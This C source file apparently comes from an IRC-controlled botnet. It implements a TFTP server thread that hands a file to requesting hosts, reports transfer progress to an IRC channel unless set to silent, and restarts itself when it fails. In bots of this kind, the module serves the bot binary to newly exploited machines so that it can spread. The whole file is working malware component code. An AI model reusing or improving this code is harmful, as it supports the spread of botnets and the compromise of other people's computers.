#include "../h/includes.h"
#include "../h/functions.h"
#include "../h/externs.h"

#ifndef NO_TFTPD

DWORD WINAPI TftpdThread(LPVOID param) 
{ 
	FILE *fp;

	char sendbuf[IRCLINE], buffer[128], type[]="octet", IP[18];
	int err=1; 

	TFTPD tftpd = *((TFTPD *)param);
	TFTPD *tftpds = (TFTPD *)param;
	tftpds->gotinfo = TRUE;
	tftpd.threads++; 

	SOCKET ssock;
	if ((ssock=fsocket(AF_INET,SOCK_DGRAM,0)) == INVALID_SOCKET) {
		Sleep(400);
		sprintf(sendbuf,"[TFTPD]: Error: socket() failed, returned: <%d>.", fWSAGetLastError());
		if (!tftpd.silent) irc_privmsg(tftpd.sock,tftpd.chan,sendbuf,tftpd.notice);
		addlog(sendbuf);

		clearthread(tftpd.threadnum);

		ExitThread(0);
	}
	threads[tftpd.threadnum].sock=ssock;

	SOCKADDR_IN ssin;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET; 
	ssin.sin_port = fhtons(tftpd.port); 
	ssin.sin_addr.s_addr = INADDR_ANY; 

	if((fbind(ssock, (LPSOCKADDR)&ssin, sizeof(ssin))) == SOCKET_ERROR) { 
		Sleep(5000); 
		tftpd.threads--; 

		return TftpdThread(param); 
	} 

	if ((fp=fopen(tftpd.filename, "rb")) == NULL) {
		Sleep(400);
		sprintf(sendbuf,"[TFTPD]: Failed to open file: %s.",tftpd.filename);
		irc_privmsg(tftpd.sock,tftpd.chan,sendbuf,tftpd.notice);
		addlog(sendbuf);

		clearthread(tftpd.threadnum);

		ExitThread(0);
	}

	while(err>0 && tftpds->gotinfo && fp) { 
		TIMEVAL timeout; 
		timeout.tv_sec=5; 
		timeout.tv_usec=5000; 

		fd_set fd; 
		FD_ZERO(&fd); 
		FD_SET(ssock,&fd); 

		memset(buffer,0,sizeof(buffer)); 
		if(fselect(0,&fd,NULL,NULL,&timeout) > 0) { 
			SOCKADDR_IN csin; 
			int csin_len=sizeof(csin); 
			char f_buffer[BLOCKSIZE+4]=""; 
			
			err=frecvfrom(ssock, buffer, sizeof(buffer), 0, (LPSOCKADDR)&csin, &csin_len); 
			sprintf(IP,finet_ntoa(csin.sin_addr));
        
			// parse buffer
			if(buffer[0]==0 && buffer[1]==1) { //RRQ
				char *tmprequest=buffer,*tmptype=buffer;
				tmprequest+=2; //skip the opcode
				tmptype+=(strlen(tftpd.requestname)+3); //skip the opcode and request name + NULL
				if(strncmp(tftpd.requestname,tmprequest,strlen(tftpd.requestname)) != 0||strncmp(type,tmptype,strlen(type)) != 0) { 
					fsendto(ssock, "\x00\x05\x00\x01\x46\x69\x6C\x65\x20\x4E\x6F\x74\x20\x46\x6F\x75\x6E\x64\x00", 19, 0, (LPSOCKADDR)&csin,csin_len);
					// for loop to add a \0 to the end of the requestname
					sprintf(buffer,"[TFTPD]: File not found: %s (%s).",IP,tftpd.requestname);
					addlog(buffer);
				} else { // good rrq packet send first data packet 
					fseek(fp, 0, SEEK_SET); 
					f_buffer[0]=0; f_buffer[1]=3; // DATA
					f_buffer[2]=0; f_buffer[3]=1; // DATA BLOCK #
					err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
					fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);

					sprintf(sendbuf,"[TFTPD]: File transfer started to IP: %s (%s).",IP,tftpd.filename);
					if (!tftpd.silent) irc_privmsg(tftpd.sock,tftpd.chan,sendbuf,tftpd.notice);
					addlog(sendbuf);
				} 
			} else if(buffer[0]==0 && buffer[1]==4) { // ACK 
				// send next packet 
				unsigned int blocks; 
				BYTE b1=buffer[2],b2=buffer[3]; // ACK BLOCK #

				f_buffer[0]=0; f_buffer[1]=3;	// DATA
				if (b2==255) {					// DATA BLOCK #
					f_buffer[2]=++b1;
					f_buffer[3]=b2=0;
				} else {
					f_buffer[2]=b1;
					f_buffer[3]=++b2;
				}

				blocks=(b1 * 256) + b2 - 1; 
				// remember to subtract 1 as the ACK block # is 1 more than the actual file block #
				fseek(fp, blocks * BLOCKSIZE, SEEK_SET); 
				err=fread(&f_buffer[4], 1, BLOCKSIZE, fp); 
				fsendto(ssock, f_buffer, err + 4, 0, (LPSOCKADDR)&csin, csin_len);
				if (err==0) {
					sprintf(sendbuf,"[TFTPD]: File transfer complete to IP: %s (%s).",IP,tftpd.filename);
					if (!tftpd.silent) irc_privmsg(tftpd.sock,tftpd.chan,sendbuf,tftpd.notice);
					addlog(sendbuf);
				}
			} else { // we dont support any other commands 
				fsendto(ssock, "\x00\x05\x00\x04\x6B\x74\x68\x78\x00",9, 0, (LPSOCKADDR)&csin, csin_len); 
			} 
		} else 
			continue;
	} 
	// check for ack, then msg irc on transfer complete

	fclosesocket(ssock); 
	fclose(fp); 

	tftpd.threads--; 
	if(tftpds->gotinfo == FALSE) {
		clearthread(tftpd.threadnum);

		ExitThread(0); 
	}
	Sleep(1000);
   
	return TftpdThread(param); 
} 
#endif